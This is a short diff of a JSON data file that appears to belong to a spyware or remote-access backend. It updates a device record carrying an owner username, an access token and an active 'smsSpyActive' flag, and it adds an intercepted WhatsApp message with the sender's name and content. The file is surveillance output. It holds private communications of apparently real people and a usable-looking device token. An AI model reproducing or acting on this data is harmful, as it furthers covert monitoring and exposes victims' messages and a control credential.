@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776919170602,
+    "lastSeen": 1776919179811,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -9969,6 +9969,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (2 pesan): ~ ST.AISYAH.S",
+        "content": "Ma uccang dg .sanga juga",
+        "time": "23/04 12:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776919171896
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
